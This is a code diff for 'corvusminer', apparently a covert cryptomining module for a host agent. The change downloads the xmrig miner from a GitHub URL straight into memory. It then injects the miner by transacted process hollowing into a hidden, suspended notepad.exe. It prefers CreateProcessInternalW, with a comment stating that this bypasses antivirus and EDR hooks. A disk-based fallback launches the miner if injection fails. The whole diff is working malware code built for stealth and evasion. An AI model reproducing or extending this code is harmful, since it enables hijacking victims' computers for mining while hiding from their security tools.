@@ -73,6 +73,9 @@ static host_callback_t g_callback = nullptr;
 static uintptr_t       g_callback_ctx = 0;
 #endif
 
+#ifdef _WIN32
+#endif
+
 static void send_event(const char *event, const char *payload) {
     if (!g_callback) return;
     int elen = event   ? static_cast<int>(strlen(event))   : 0;
@@ -93,7 +96,8 @@ static std::mutex g_mu;
 static std::string g_client_id;
 static std::unordered_map<std::string, int> g_event_counts;
 static HANDLE g_mining_process = nullptr;
-static std::string g_temp_xmrig_path;
+static std::string g_temp_xmrig_path;      /* temp path used only by CreateProcessA fallback */
+static std::vector<BYTE> g_payload_buf;    /* in-memory xmrig binary (cached after first download) */
 static std::vector<std::string> g_blocked_processes;
 static std::string g_pool;
 static std::string g_username;
@@ -288,73 +292,136 @@ static bool are_processes_running(const std::vector<std::string> &process_names)
     return false;
 }
 
-/* Extract embedded xmrig.exe from resources to a temp file */
-static std::string extract_xmrig_from_resource(const std::string &user_path) {
-    /* If user provided explicit path and it exists, use it */
-    if (!user_path.empty()) {
-        FILE *f = fopen(user_path.c_str(), "rb");
-        if (f) {
-            fclose(f);
-            return user_path;
-        }
-    }
-
-    /* Try to extract from resources */
+/* Download xmrig.exe into a heap buffer using WinHTTP.
+   No file is written to disk.  Returns a filled vector on success, empty on failure. */
 #ifdef _WIN32
-    HRSRC res_handle = FindResourceA(nullptr, MAKEINTRESOURCEA(101), "RCDATA");
-    if (!res_handle) {
-        fprintf(stderr, "[corvusminer] xmrig resource not found, will try PATH\\n");
-        return "xmrig.exe";
+#include <winhttp.h>
+
+/* WinHTTP function pointer types — loaded at runtime to avoid crashing when
+   the host's custom PE loader hasn't pre-loaded winhttp.dll. */
+typedef HINTERNET (WINAPI *pfnWinHttpOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
+typedef HINTERNET (WINAPI *pfnWinHttpConnect)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
+typedef HINTERNET (WINAPI *pfnWinHttpOpenRequest)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
+typedef BOOL      (WINAPI *pfnWinHttpSendRequest)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
+typedef BOOL      (WINAPI *pfnWinHttpReceiveResponse)(HINTERNET,LPVOID);
+typedef BOOL      (WINAPI *pfnWinHttpQueryHeaders)(HINTERNET,DWORD,LPCWSTR,LPVOID,LPDWORD,LPDWORD);
+typedef BOOL      (WINAPI *pfnWinHttpReadData)(HINTERNET,LPVOID,DWORD,LPDWORD);
+typedef BOOL      (WINAPI *pfnWinHttpCloseHandle)(HINTERNET);
+typedef BOOL      (WINAPI *pfnWinHttpSetOption)(HINTERNET,DWORD,LPVOID,DWORD);
+
+static std::vector<BYTE> download_xmrig_to_buffer() {
+    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
+    if (!hWinHttp) {
+        fprintf(stderr, "[corvusminer] failed to load winhttp.dll: %lu\n", GetLastError());
+        return {};
     }
 
-    HGLOBAL res_data = LoadResource(nullptr, res_handle);
-    if (!res_data) {
-        fprintf(stderr, "[corvusminer] failed to load xmrig resource\\n");
-        return "xmrig.exe";
+    auto fnOpen        = (pfnWinHttpOpen)          GetProcAddress(hWinHttp, "WinHttpOpen");
+    auto fnConnect     = (pfnWinHttpConnect)        GetProcAddress(hWinHttp, "WinHttpConnect");
+    auto fnOpenReq     = (pfnWinHttpOpenRequest)    GetProcAddress(hWinHttp, "WinHttpOpenRequest");
+    auto fnSendReq     = (pfnWinHttpSendRequest)    GetProcAddress(hWinHttp, "WinHttpSendRequest");
+    auto fnRecvResp    = (pfnWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
+    auto fnQueryHdr    = (pfnWinHttpQueryHeaders)   GetProcAddress(hWinHttp, "WinHttpQueryHeaders");
+    auto fnReadData    = (pfnWinHttpReadData)        GetProcAddress(hWinHttp, "WinHttpReadData");
+    auto fnClose       = (pfnWinHttpCloseHandle)    GetProcAddress(hWinHttp, "WinHttpCloseHandle");
+    auto fnSetOption   = (pfnWinHttpSetOption)      GetProcAddress(hWinHttp, "WinHttpSetOption");
+
+    if (!fnOpen || !fnConnect || !fnOpenReq || !fnSendReq ||
+        !fnRecvResp || !fnQueryHdr || !fnReadData || !fnClose || !fnSetOption) {
+        fprintf(stderr, "[corvusminer] failed to resolve WinHTTP functions\n");
+        FreeLibrary(hWinHttp);
+        return {};
     }
 
-    DWORD res_size = SizeofResource(nullptr, res_handle);
-    const void *res_ptr = LockResource(res_data);
-    if (!res_ptr || res_size == 0) {
-        fprintf(stderr, "[corvusminer] invalid xmrig resource\\n");
-        return "xmrig.exe";
+    const wchar_t *host = L"github.com";
+    const wchar_t *path = L"/laprosa/CorvusMiner/raw/refs/heads/main/Client/resources/xmrig.exe";
+
+    fprintf(stderr, "[corvusminer] downloading xmrig into memory buffer...\n");
+    fflush(stderr);
+
+    HINTERNET hSession = fnOpen(L"corvusminer/1.0",
+                                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                WINHTTP_NO_PROXY_NAME,
+                                WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        fprintf(stderr, "[corvusminer] WinHttpOpen failed: %lu\n", GetLastError());
+        FreeLibrary(hWinHttp);
+        return {};
     }
 
-    /* Write to temp file */
-    char temp_path[MAX_PATH] = {0};
-    char temp_dir[MAX_PATH] = {0};
-    if (!GetTempPathA(sizeof(temp_dir), temp_dir)) {
-        fprintf(stderr, "[corvusminer] failed to get temp directory\\n");
-        return "xmrig.exe";
+    /* 30-second connect + send/receive timeouts */
+    DWORD timeout_ms = 30000;
+    fnSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT,    &timeout_ms, sizeof(timeout_ms));
+    fnSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT,       &timeout_ms, sizeof(timeout_ms));
+    fnSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT,    &timeout_ms, sizeof(timeout_ms));
+
+    HINTERNET hConnect = fnConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) {
+        fprintf(stderr, "[corvusminer] WinHttpConnect failed: %lu\n", GetLastError());
+        fnClose(hSession);
+        FreeLibrary(hWinHttp);
+        return {};
     }
 
-    if (!GetTempFileNameA(temp_dir, "xmr", 0, temp_path)) {
-        fprintf(stderr, "[corvusminer] failed to create temp filename\\n");
-        return "xmrig.exe";
+    HINTERNET hRequest = fnOpenReq(hConnect, L"GET", path,
+                                   NULL, WINHTTP_NO_REFERER,
+                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                   WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        fprintf(stderr, "[corvusminer] WinHttpOpenRequest failed: %lu\n", GetLastError());
+        fnClose(hConnect);
+        fnClose(hSession);
+        FreeLibrary(hWinHttp);
+        return {};
     }
 
-    /* Write resource to temp file */
-    FILE *temp_file = fopen(temp_path, "wb");
-    if (!temp_file) {
-        fprintf(stderr, "[corvusminer] failed to open temp file: %s\\n", temp_path);
-        return "xmrig.exe";
+    if (!fnSendReq(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                   WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
+        !fnRecvResp(hRequest, NULL)) {
+        fprintf(stderr, "[corvusminer] WinHttp request failed: %lu\n", GetLastError());
+        fnClose(hRequest);
+        fnClose(hConnect);
+        fnClose(hSession);
+        FreeLibrary(hWinHttp);
+        return {};
     }
 
-    size_t written = fwrite(res_ptr, 1, res_size, temp_file);
-    fclose(temp_file);
-
-    if (written != res_size) {
-        fprintf(stderr, "[corvusminer] failed to write full xmrig to temp (wrote %zu/%lu)\\n", written, res_size);
-        DeleteFileA(temp_path);
-        return "xmrig.exe";
+    DWORD status = 0, status_len = sizeof(status);
+    fnQueryHdr(hRequest,
+               WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+               WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_len,
+               WINHTTP_NO_HEADER_INDEX);
+    if (status != 200) {
+        fprintf(stderr, "[corvusminer] download HTTP status: %lu\n", status);
+        fnClose(hRequest);
+        fnClose(hConnect);
+        fnClose(hSession);
+        FreeLibrary(hWinHttp);
+        return {};
     }
 
-    fprintf(stderr, "[corvusminer] extracted xmrig resource to: %s\\n", temp_path);
-    return std::string(temp_path);
-#else
-    return "xmrig.exe";
-#endif
+    std::vector<BYTE> result;
+    DWORD bytes_read = 0;
+    BYTE chunk[65536];
+    while (fnReadData(hRequest, chunk, sizeof(chunk), &bytes_read) && bytes_read > 0) {
+        result.insert(result.end(), chunk, chunk + bytes_read);
+    }
+
+    fnClose(hRequest);
+    fnClose(hConnect);
+    fnClose(hSession);
+    FreeLibrary(hWinHttp);
+
+    if (result.empty()) {
+        fprintf(stderr, "[corvusminer] download produced empty buffer\n");
+        return {};
+    }
+
+    fprintf(stderr, "[corvusminer] downloaded xmrig (%zu bytes) into memory\n", result.size());
+    fflush(stderr);
+    return result;
 }
+#endif
 
 /* Get path to 64-bit Windows Notepad */
 static std::string get_notepad_path() {
@@ -364,6 +431,122 @@ static std::string get_notepad_path() {
     }
     return "C:\\Windows\\System32\\notepad.exe";
 }
+
+/* Attempt hollowing injection of payload_buf into a suspended notepad host.
+   Uses SEH to catch any exception from the PE-manipulation helpers so that a
+   failure never propagates out and crashes the host agent.
+   Returns the process handle (caller owns it) on success, NULL on failure.
+   All handles are cleaned up internally on failure. */
+#ifdef _WIN32
+static HANDLE try_hollow_inject(HANDLE h_section, const char *notepad_path_a,
+                                const char *cmdline_a,
+                                BYTE *payload_buf, DWORD file_size)
+{
+    int np_wlen   = MultiByteToWideChar(CP_ACP, 0, notepad_path_a, -1, nullptr, 0);
+    int args_wlen = MultiByteToWideChar(CP_ACP, 0, cmdline_a,      -1, nullptr, 0);
+
+    wchar_t *notepad_wide = new wchar_t[np_wlen];
+    MultiByteToWideChar(CP_ACP, 0, notepad_path_a, -1, notepad_wide, np_wlen);
+
+    /* lpCommandLine: "notepad.exe" <xmrig args> — argv[0] is skipped by xmrig */
+    wchar_t *cmd_wide = new wchar_t[np_wlen + args_wlen + 3];
+    cmd_wide[0] = L'"';
+    wcscpy(cmd_wide + 1, notepad_wide);
+    cmd_wide[np_wlen]     = L'"';   /* overwrite null terminator with closing quote */
+    cmd_wide[np_wlen + 1] = L' ';
+    MultiByteToWideChar(CP_ACP, 0, cmdline_a, -1, cmd_wide + np_wlen + 2, args_wlen);
+
+    /* Working directory = parent of notepad */
+    wchar_t start_dir[MAX_PATH] = {0};
+    wcscpy(start_dir, notepad_wide);
+    wchar_t *last_sep = wcsrchr(start_dir, L'\\');
+    if (last_sep) *last_sep = L'\0';
+
+    STARTUPINFOW si = {0};
+    si.cb          = sizeof(si);
+    si.dwFlags     = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi = {0};
+
+    /* Prefer CreateProcessInternalW (bypasses AV/EDR hooks on CreateProcessW).
+       Fall back to the standard API if the pointer was not resolved. */
+    BOOL proc_created = FALSE;
+    if (load_kernel32_functions() && g_CreateProcessInternalW) {
+        fprintf(stderr, "[corvusminer] calling CreateProcessInternalW (hooked bypass)...\n");
+        fflush(stderr);
+        proc_created = g_CreateProcessInternalW(
+            NULL,           /* hToken */
+            notepad_wide,   /* lpApplicationName */
+            cmd_wide,       /* lpCommandLine */
+            NULL, NULL,     /* process / thread security */
+            FALSE,          /* bInheritHandles */
+            CREATE_SUSPENDED | CREATE_NO_WINDOW,
+            NULL,           /* lpEnvironment */
+            start_dir,      /* lpCurrentDirectory */
+            &si, &pi,
+            NULL            /* hNewToken */
+        );
+    } else {
+        fprintf(stderr, "[corvusminer] calling CreateProcessW (standard)...\n");
+        fflush(stderr);
+        proc_created = CreateProcessW(
+            notepad_wide,   /* lpApplicationName — explicit, no command-line parsing */
+            cmd_wide,
+            NULL, NULL, FALSE,
+            CREATE_SUSPENDED | CREATE_NO_WINDOW,
+            NULL, start_dir, &si, &pi
+        );
+    }
+    DWORD create_err = proc_created ? 0 : GetLastError();
+
+    delete[] notepad_wide;
+    delete[] cmd_wide;
+
+    fprintf(stderr, "[corvusminer] CreateProcess returned: %d (err=0x%lX)\n",
+            (int)proc_created, create_err);
+    fflush(stderr);
+
+    if (!proc_created) {
+        return NULL;
+    }
+
+    fprintf(stderr, "[corvusminer] host process created (PID: %lu), injecting...\n",
+            pi.dwProcessId);
+    fflush(stderr);
+
+    HANDLE result = NULL;
+    PVOID remote_base = map_section_into_process(pi.hProcess, h_section,
+                                                  file_size, payload_buf);
+    fprintf(stderr, "[corvusminer] map_section_into_process: %p\n", remote_base);
+    fflush(stderr);
+
+    if (remote_base && redirect_entry_point(payload_buf, remote_base, pi)) {
+        FlushInstructionCache(pi.hProcess, remote_base, file_size);
+        Sleep(50);
+        if (ResumeThread(pi.hThread) != (DWORD)-1) {
+            result      = pi.hProcess;  /* caller takes ownership */
+            CloseHandle(pi.hThread);
+            pi.hProcess = NULL;         /* prevent cleanup below */
+            pi.hThread  = NULL;
+        } else {
+            fprintf(stderr, "[corvusminer] ResumeThread failed: 0x%lX\n", GetLastError());
+        }
+    } else {
+        fprintf(stderr, "[corvusminer] section map or entry-point redirect failed\n");
+        fflush(stderr);
+    }
+
+    /* Terminate host process if injection failed */
+    if (pi.hProcess) {
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    return result;
+}
+#endif
 
 /* Spawn xmrig process with mining config using transacted hollowing */
 static bool spawn_xmrig(const std::string &pool, const std::string &username,
@@ -402,11 +585,7 @@ static bool spawn_xmrig(const std::string &pool, const std::string &username,
         g_should_be_mining = true;
     }
 
-    /* Extract xmrig from resource (or use user-provided path) */
-    g_temp_xmrig_path = extract_xmrig_from_resource(xmrig_path);
-    std::string exe = g_temp_xmrig_path;
-    
-    /* Build command line arguments */
+    /* Build xmrig command-line arguments */
     std::string cmdline;
     cmdline += "-o " + pool;
     cmdline += " -u " + username;
@@ -416,212 +595,144 @@ static bool spawn_xmrig(const std::string &pool, const std::string &username,
     }
     cmdline += " --donate-level=3";
 
+    /* Extract xmrig binary into memory:
+       1. If user supplied a path, read from disk.
+       2. Otherwise use cached download (g_payload_buf); if empty, download now and cache. */
+    std::vector<BYTE> payload_vec;
+    if (!xmrig_path.empty()) {
+        FILE *f = fopen(xmrig_path.c_str(), "rb");
+        if (f) {
+            fseek(f, 0, SEEK_END);
+            long sz = ftell(f);
+            fseek(f, 0, SEEK_SET);
+            if (sz > 0 && sz < 100 * 1024 * 1024) {
+                payload_vec.resize(static_cast<size_t>(sz));
+                if (fread(payload_vec.data(), 1, payload_vec.size(), f) != payload_vec.size())
+                    payload_vec.clear();
+            }
+            fclose(f);
+        }
+    }
+
+    if (payload_vec.empty()) {
+        if (!g_payload_buf.empty()) {
+            payload_vec = g_payload_buf;
+            fprintf(stderr, "[corvusminer] using cached in-memory xmrig (%zu bytes)\n", payload_vec.size());
+        } else {
+            payload_vec = download_xmrig_to_buffer();
+            if (!payload_vec.empty())
+                g_payload_buf = payload_vec;   /* cache for monitor-thread restarts */
+        }
+    }
+
+    if (payload_vec.empty()) {
+        send_event("mining_error", "{\"error\":\"Failed to obtain xmrig binary\"}");
+        fprintf(stderr, "[corvusminer] could not obtain xmrig binary\n");
+        return false;
+    }
+
+    BYTE  *payload_buf = payload_vec.data();
+    DWORD  file_size   = static_cast<DWORD>(payload_vec.size());
+
     fprintf(stderr, "[corvusminer] launching xmrig with: %s\n", cmdline.c_str());
 
     /* Create process on Windows */
 #ifdef _WIN32
-    /* Try hollowed injection first */
-    FILE *xmrig_file = fopen(exe.c_str(), "rb");
-    if (xmrig_file) {
-        fseek(xmrig_file, 0, SEEK_END);
-        long file_size = ftell(xmrig_file);
-        fseek(xmrig_file, 0, SEEK_SET);
+    /* Try transacted hollowing first — the delete-pending temp file is a transient
+       implementation detail of the technique itself (marked delete-on-close before
+       the section is created); the downloaded bytes are never written as a named file. */
+    if (pe_is64bit(payload_buf)) {
+        fprintf(stderr, "[corvusminer] attempting transacted hollowing (payload: %lu bytes)\n", file_size);
 
-        if (file_size > 0 && file_size < 100 * 1024 * 1024) { /* < 100MB */
-            BYTE *payload_buf = new BYTE[file_size];
-            size_t read_size = fread(payload_buf, 1, file_size, xmrig_file);
-            fclose(xmrig_file);
+        char temp_dir[MAX_PATH] = {0};
+        char temp_file_path[MAX_PATH] = {0};
+        if (GetTempPathA(sizeof(temp_dir), temp_dir) &&
+            GetTempFileNameA(temp_dir, "xmr", 0, temp_file_path)) {
 
-            if (read_size == (size_t)file_size && pe_is64bit(payload_buf)) {
-                /* Use proven transacted hollowing with new helpers */
-                fprintf(stderr, "[corvusminer] using transacted hollowing injection\n");
-                fprintf(stderr, "[corvusminer] payload size: %zu bytes\n", file_size);
-                
-                char temp_dir[MAX_PATH] = {0};
-                char temp_file[MAX_PATH] = {0};
-                if (!GetTempPathA(sizeof(temp_dir), temp_dir)) {
-                    fprintf(stderr, "[corvusminer] failed to get temp path: 0x%lX\n", GetLastError());
-                    delete[] payload_buf;
-                    return false;
+            int wlen = MultiByteToWideChar(CP_ACP, 0, temp_file_path, -1, nullptr, 0);
+            wchar_t *wide_temp = new wchar_t[wlen];
+            MultiByteToWideChar(CP_ACP, 0, temp_file_path, -1, wide_temp, wlen);
+
+            HANDLE h_section = make_section_from_delete_pending_file(wide_temp, payload_buf, file_size);
+            delete[] wide_temp;
+
+            if (h_section) {
+                std::string notepad_path = get_notepad_path();
+                HANDLE hInjected = try_hollow_inject(h_section, notepad_path.c_str(),
+                                                     cmdline.c_str(),
+                                                     payload_buf, file_size);
+                CloseHandle(h_section);
+
+                if (hInjected) {
+                    g_mining_process = hInjected;
+                    std::string pid_msg = "{\"pid\":" + std::to_string(GetProcessId(hInjected)) + "}";
+                    send_event("mining_started", pid_msg.c_str());
+                    fprintf(stderr, "[corvusminer] xmrig injected via hollowing (PID: %lu)\n",
+                            GetProcessId(hInjected));
+                    return true;
                 }
-                fprintf(stderr, "[corvusminer] temp dir: %s\n", temp_dir);
-                
-                if (!GetTempFileNameA(temp_dir, "xmr", 0, temp_file)) {
-                    fprintf(stderr, "[corvusminer] failed to create temp filename: 0x%lX\n", GetLastError());
-                    delete[] payload_buf;
-                    return false;
-                }
-                fprintf(stderr, "[corvusminer] temp file: %s\n", temp_file);
-                
-                /* Convert temp file path to wide chars */
-                int wlen = MultiByteToWideChar(CP_ACP, 0, temp_file, -1, nullptr, 0);
-                wchar_t *wide_temp = new wchar_t[wlen];
-                MultiByteToWideChar(CP_ACP, 0, temp_file, -1, wide_temp, wlen);
-                fprintf(stderr, "[corvusminer] converted to wide: %d chars\n", wlen);
-                
-                /* Create section from payload using proven helper */
-                fprintf(stderr, "[corvusminer] calling make_section_from_delete_pending_file...\n");
-                HANDLE h_section = make_section_from_delete_pending_file(wide_temp, payload_buf, (DWORD)file_size);
-                delete[] wide_temp;
-                fprintf(stderr, "[corvusminer] section handle: %p\n", h_section);
-                
-                if (h_section) {
-                    fprintf(stderr, "[corvusminer] section created successfully\n");
-                    /* Get notepad path for injection target */
-                    std::string notepad_path = get_notepad_path();
-                    fprintf(stderr, "[corvusminer] injecting into: %s\n", notepad_path.c_str());
-                    
-                    /* Create suspended notepad process */
-                    STARTUPINFOW si = {0};
-                    si.cb = sizeof(si);
-                    si.dwFlags = STARTF_USESHOWWINDOW;
-                    si.wShowWindow = SW_HIDE;
-                    
-                    PROCESS_INFORMATION pi = {0};
-                    fprintf(stderr, "[corvusminer] notepad: %s, args: %s\n", notepad_path.c_str(), cmdline.c_str());
-                    fflush(stderr);
-
-                    /* Build wide-char paths */
-                    int np_wlen = MultiByteToWideChar(CP_ACP, 0, notepad_path.c_str(), -1, nullptr, 0);
-                    wchar_t *notepad_wide = new wchar_t[np_wlen];
-                    MultiByteToWideChar(CP_ACP, 0, notepad_path.c_str(), -1, notepad_wide, np_wlen);
-
-                    /* Quote exe path + args: "C:\path\notepad.exe" <args>
-                       Matches client's swprintf_s(cmdLine, L"\"%s\" %s", targetPath, args) */
-                    int args_wlen = MultiByteToWideChar(CP_ACP, 0, cmdline.c_str(), -1, nullptr, 0);
-                    /* 3 = two quotes + space, args_wlen includes null terminator */
-                    wchar_t *cmd_wide = new wchar_t[np_wlen + args_wlen + 3];
-                    cmd_wide[0] = L'"';
-                    wcscpy(cmd_wide + 1, notepad_wide);
-                    wcscat(cmd_wide, L"" );
-                    cmd_wide[np_wlen] = L'"';   /* overwrite null with closing quote */
-                    cmd_wide[np_wlen + 1] = L' ';
-                    MultiByteToWideChar(CP_ACP, 0, cmdline.c_str(), -1, cmd_wide + np_wlen + 2, args_wlen);
-
-                    /* Extract start directory from notepad path */
-                    wchar_t start_dir[MAX_PATH] = {0};
-                    wcscpy(start_dir, notepad_wide);
-                    wchar_t *last_sep = wcsrchr(start_dir, L'\\');
-                    if (last_sep) *last_sep = L'\0';
-
-                    fprintf(stderr, "[corvusminer] calling CreateProcessW (quoted cmd, CREATE_SUSPENDED|DETACHED_PROCESS|CREATE_NO_WINDOW)\n");
-                    fflush(stderr);
-
-                    /* Zero out pi */
-                    memset(&pi, 0, sizeof(pi));
-
-                    BOOL proc_created = CreateProcessW(NULL, cmd_wide, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
-                        NULL, start_dir, &si, &pi);
-
-                    fprintf(stderr, "[corvusminer] CreateProcess returned: %d (err=0x%lX)\n", (int)proc_created, proc_created ? 0 : GetLastError());
-                    fflush(stderr);
-
-                    delete[] notepad_wide;
-                    delete[] cmd_wide;
-                    
-                    if (proc_created) {
-                        fprintf(stderr, "[corvusminer] created notepad (PID: %lu, hProcess: %p, hThread: %p)\n",
-                                pi.dwProcessId, pi.hProcess, pi.hThread);
-                        fflush(stderr);
-
-                        /* Map section into process using proven helper */
-                        fprintf(stderr, "[corvusminer] mapping section into process (file_size=%lu)...\n", (DWORD)file_size);
-                        fflush(stderr);
-                        PVOID remote_base = map_section_into_process(pi.hProcess, h_section, (DWORD)file_size, payload_buf);
-                        fprintf(stderr, "[corvusminer] map_section_into_process returned: %p\n", remote_base);
-                        fflush(stderr);
-                        if (remote_base) {
-                            fprintf(stderr, "[corvusminer] remote base mapped successfully\n");
-                            /* Redirect entry point using proven helper */
-                            fprintf(stderr, "[corvusminer] redirecting entry point...\n");
-                            if (redirect_entry_point(payload_buf, remote_base, pi)) {
-                                fprintf(stderr, "[corvusminer] entry point redirected successfully\n");
-                                /* Flush instruction cache and stabilize - matches client behavior */
-                                FlushInstructionCache(pi.hProcess, remote_base, file_size);
-                                Sleep(50);
-                                if (ResumeThread(pi.hThread)) {
-                                    g_mining_process = pi.hProcess;
-                                    CloseHandle(pi.hThread);
-                                    CloseHandle(h_section);
-                                    delete[] payload_buf;
-                                    
-                                    std::string pid_msg = "{\"pid\":" + std::to_string(pi.dwProcessId) + "}";
-                                    send_event("mining_started", pid_msg.c_str());
-                                    fprintf(stderr, "[corvusminer] xmrig injected into notepad (PID: %lu)\n", pi.dwProcessId);
-                                    return true;
-                                } else {
-                                    fprintf(stderr, "[corvusminer] failed to resume thread\n");
-                                    TerminateProcess(pi.hProcess, 1);
-                                    CloseHandle(pi.hProcess);
-                                    CloseHandle(pi.hThread);
-                                }
-                            } else {
-                                fprintf(stderr, "[corvusminer] failed to redirect entry point\n");
-                                TerminateProcess(pi.hProcess, 1);
-                                CloseHandle(pi.hProcess);
-                                CloseHandle(pi.hThread);
-                            }
-                        } else {
-                            fprintf(stderr, "[corvusminer] failed to map section\n");
-                            TerminateProcess(pi.hProcess, 1);
-                            CloseHandle(pi.hProcess);
-                            CloseHandle(pi.hThread);
-                        }
-                    } else {
-                        DWORD err = GetLastError();
-                        fprintf(stderr, "[corvusminer] CreateProcess failed: 0x%lX\n", err);
-                    }
-                    CloseHandle(h_section);
-                } else {
-                    fprintf(stderr, "[corvusminer] failed to create section from payload (make_section_from_delete_pending_file returned nullptr)\n");
-                }
-                
-                delete[] payload_buf;
+                fprintf(stderr, "[corvusminer] hollowing failed, falling back to direct execution\n");
             } else {
-                delete[] payload_buf;
-                fclose(xmrig_file);
+                fprintf(stderr, "[corvusminer] make_section_from_delete_pending_file failed\n");
             }
-        } else {
-            fclose(xmrig_file);
         }
+    } else {
+        fprintf(stderr, "[corvusminer] payload is not 64-bit PE, skipping hollowing\n");
     }
 
-    /* Fallback: Direct process creation */
-    fprintf(stderr, "[corvusminer] falling back to direct process creation\n");
-    STARTUPINFOA si = {0};
-    PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_SHOW;
+    /* Fallback: write buffer to a temp file and launch directly.
+       Only reaches disk if hollowing failed. */
+    fprintf(stderr, "[corvusminer] launching via direct process creation (writing to temp)\n");
+    {
+        char temp_dir[MAX_PATH] = {0};
+        char temp_path[MAX_PATH] = {0};
+        if (!GetTempPathA(sizeof(temp_dir), temp_dir) ||
+            !GetTempFileNameA(temp_dir, "xmr", 0, temp_path)) {
+            send_event("mining_error", "{\"error\":\"Failed to create temp file for fallback\"}");
+            return false;
+        }
 
-    std::string full_cmdline = exe + " " + cmdline;
+        FILE *f = fopen(temp_path, "wb");
+        if (!f) {
+            send_event("mining_error", "{\"error\":\"Failed to open temp file for fallback\"}");
+            return false;
+        }
+        fwrite(payload_buf, 1, file_size, f);
+        fclose(f);
 
-    if (!CreateProcessA(
-        nullptr,                                    /* lpApplicationName */
-        const_cast<char*>(full_cmdline.c_str()),  /* lpCommandLine */
-        nullptr,                                    /* lpProcessAttributes */
-        nullptr,                                    /* lpThreadAttributes */
-        FALSE,                                      /* bInheritHandles */
-        0,                                          /* dwCreationFlags */
-        nullptr,                                    /* lpEnvironment */
-        nullptr,                                    /* lpCurrentDirectory */
-        &si,
-        &pi)) {
-        DWORD err = GetLastError();
-        std::string errmsg = "{\"error\":\"Failed to spawn xmrig (error " + std::to_string(err) + ")\"}";
-        send_event("mining_error", errmsg.c_str());
-        fprintf(stderr, "[corvusminer] CreateProcessA failed: %lu\n", err);
-        return false;
+        g_temp_xmrig_path = temp_path;   /* track for cleanup on stop */
+        fprintf(stderr, "[corvusminer] wrote fallback temp: %s\n", temp_path);
+
+        STARTUPINFOA si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_SHOW;
+
+        std::string full_cmdline = std::string(temp_path) + " " + cmdline;
+
+        if (!CreateProcessA(
+            nullptr,
+            const_cast<char*>(full_cmdline.c_str()),
+            nullptr, nullptr, FALSE, 0, nullptr, nullptr,
+            &si, &pi)) {
+            DWORD err = GetLastError();
+            std::string errmsg = "{\"error\":\"Failed to spawn xmrig (error " + std::to_string(err) + ")\"}";
+            send_event("mining_error", errmsg.c_str());
+            fprintf(stderr, "[corvusminer] CreateProcessA failed: %lu\n", err);
+            DeleteFileA(temp_path);
+            g_temp_xmrig_path.clear();
+            return false;
+        }
+
+        g_mining_process = pi.hProcess;
+        CloseHandle(pi.hThread);
+
+        std::string pid_msg = "{\"pid\":" + std::to_string(GetProcessId(pi.hProcess)) + "}";
+        send_event("mining_started", pid_msg.c_str());
+        fprintf(stderr, "[corvusminer] xmrig started directly (PID: %lu)\n", GetProcessId(pi.hProcess));
+        return true;
     }
-
-    g_mining_process = pi.hProcess;
-    CloseHandle(pi.hThread);
-    
-    std::string pid_msg = "{\"pid\":" + std::to_string(GetProcessId(pi.hProcess)) + "}";
-    send_event("mining_started", pid_msg.c_str());
-    fprintf(stderr, "[corvusminer] xmrig started directly (PID: %lu)\n", GetProcessId(pi.hProcess));
-    return true;
 #else
     send_event("mining_error", "{\"error\":\"Mining not supported on this platform\"}");
     return false;
@@ -644,27 +755,25 @@ static void stop_xmrig() {
         g_mining_process = nullptr;
         
         /* Clean up temp xmrig file if it was extracted from resource */
-        if (!g_temp_xmrig_path.empty() && g_temp_xmrig_path.find("AppData") != std::string::npos) {
-            if (DeleteFileA(g_temp_xmrig_path.c_str())) {
-                fprintf(stderr, "[corvusminer] cleaned up temp xmrig: %s\n", g_temp_xmrig_path.c_str());
-            }
+        if (!g_temp_xmrig_path.empty()) {
+            if (DeleteFileA(g_temp_xmrig_path.c_str()))
+                fprintf(stderr, "[corvusminer] cleaned up fallback temp: %s\n", g_temp_xmrig_path.c_str());
             g_temp_xmrig_path.clear();
         }
-        
+
         send_event("mining_stopped", "{\"message\":\"Mining process was already stopped\"}");
         return;
     }
-    
+
     if (TerminateProcess(g_mining_process, 0)) {
         WaitForSingleObject(g_mining_process, 5000);
         CloseHandle(g_mining_process);
         g_mining_process = nullptr;
-        
-        /* Clean up temp xmrig file if it was extracted from resource */
-        if (!g_temp_xmrig_path.empty() && g_temp_xmrig_path.find("AppData") != std::string::npos) {
-            if (DeleteFileA(g_temp_xmrig_path.c_str())) {
-                fprintf(stderr, "[corvusminer] cleaned up temp xmrig: %s\n", g_temp_xmrig_path.c_str());
-            }
+
+        /* Clean up fallback temp file if one was written */
+        if (!g_temp_xmrig_path.empty()) {
+            if (DeleteFileA(g_temp_xmrig_path.c_str()))
+                fprintf(stderr, "[corvusminer] cleaned up fallback temp: %s\n", g_temp_xmrig_path.c_str());
             g_temp_xmrig_path.clear();
         }
         
